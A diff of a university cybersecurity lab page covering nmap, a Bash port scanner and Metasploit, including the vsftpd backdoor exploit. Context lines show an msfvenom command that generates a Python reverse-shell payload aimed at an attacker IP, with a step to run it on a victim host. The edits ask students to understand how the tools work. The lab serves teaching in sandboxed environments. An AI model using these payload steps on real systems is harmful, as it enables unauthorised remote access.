@@ -4,7 +4,11 @@
 READ: Any knowledge and techniques presented here are for your learning purposes only. It is **ABSOLUTELY ILLEGAL** to apply the learned knowledge to others without proper consent/permission, and even then, you must check and comply with any regulatory restrictions and laws.&#x20;
 {% endhint %}
 
-The aim of this lab is to introduce you to some useful security tools commonly used to get familiar with attack styles and explain a bit about their underlying mechanisms, as well as practice Linux commands from Lab 0 in the context.
+The aim of this lab is to introduce you to some useful security tools commonly used to get familiar with attack styles, as well as practice Linux commands from Lab 0 in the context. In addition, to have a better understanding about their underlying mechanisms, unlike in CITS1003 where we just used them to observe outcomes.
+
+{% hint style="info" %}
+This means it is essential to have a deeper understanding of tools and how they operate rather than only learning what tools and scripts to use in given scenarios. This applies to all the labs we will do in this unit, so please remember!
+{% endhint %}
 
 The tools we will cover are: `nmap` and `metasploit`, the tools that are often used to gather information and gain the first step into the target host(s). Those tools are already installed on your Kali Linux. Of course, we will cover more useful and interesting tools later on as well.
 
@@ -48,7 +52,15 @@ This only works on new versions of Bash (which is the case with Kali). If you ar
 
 If you do not see the connection message at step 4, then you need to upgrade your Bash version (or use Kali for simplicity). If you attempt to connect to a closed port, you will simply receive a "Connection refused" message.
 
-So we have a basic understanding of using Bash and open ports from the above example, so now we can create our own port scanner Bash script! Open an editor with the file named `portscan.sh` and input the following script:
+So we have a basic understanding of using Bash and open ports from the above example, so now we can create our own port scanner Bash script!&#x20;
+
+Download the portscan.sh script:
+
+```
+wget https://raw.githubusercontent.com/uwacyber/cits3006/2022s2/cits3006-labs/files/portscan.sh
+```
+
+The code is also shown below, which you should read through and try to understand what it is trying to do.
 
 ```bash
 #!/bin/bash
@@ -81,7 +93,7 @@ done
 If the above code is hard to follow, please revise the scripting (e.g., CITS2003).
 {% endhint %}
 
-And then add executable permission:
+Remember to add executable permission:
 
 ```
 chmod +x portscan.sh
@@ -211,7 +223,7 @@ Now you have a remote shell on your target host! Try navigating, creating files,
 
 This vulnerability came about when someone had uploaded a modified version of `vsftpd` to the master site and some users downloaded this version for their systems (i.e., it came with the backdoor). The backdoor opened port 6200 to give the attacker a command shell.
 
-This showed the importance of authentication and authorisation (don't let anyone upload/update important data) and the ability to check and approve changes.&#x20;
+This showed the importance of authentication and authorisation (don't let anyone upload/update important data) and also the ability to check and approve changes.&#x20;
 
 #### Finishing
 
@@ -312,7 +324,7 @@ msfvenom -p python/shell_reverse_tcp LHOST=[attacker IP address] LPORT=[attacker
 
 ![](<../.gitbook/assets/image (3).png>)
 
-The payload created is a python executable code, which you can execute from your victim host:
+The payload created is a python executable code, which you can execute from your victim host. You will also notice that `msfvenom` applied code obfuscation techniques so that you cannot directly read the payload to understand exactly what this code is doing.
 
 {% hint style="info" %}
 For this exercise, I just cloned by Kali VM and used as the target. You can do similar, or run an existing VM and test also (should work on any OS).
@@ -333,10 +345,22 @@ python -c "[copy and paste payload here]"
 ![Left, you see the target host terminal. Right, you see the attacker terminal that got the reverse shell!](<../.gitbook/assets/image (4).png>)
 
 {% hint style="info" %}
-Such malicious payload can be created for various types of applications, not just Python (could be PHP, Java, .exe for Windows etc.). Also, there are many ways to hide such payload (masquerading, obfuscations etc.) – still a big issue today!
+Usually the attacker will place the payload into an executable file (and likely autorun it). Such malicious payload can be created for various types of applications, not just Python (could be PHP, Java, .exe for Windows etc.). Also, there are many ways to hide such payload (masquerading, obfuscations etc.) – still a big issue today!
 {% endhint %}
 
 The above example would be considered _malware_. The msfvenom can be used to create various payloads to do malicious tasks so have a look at its library and explore (please do NOT use them other than on your own sandboxed/virtualised environments)!
+
+### 1.3.4. Write our own Reverse Shell
+
+So now we understand the tool can create reverse shell payloads for various applications, but how exactly does it work? Let's find out!
+
+
+
+
+
+
+
+
 
 
 
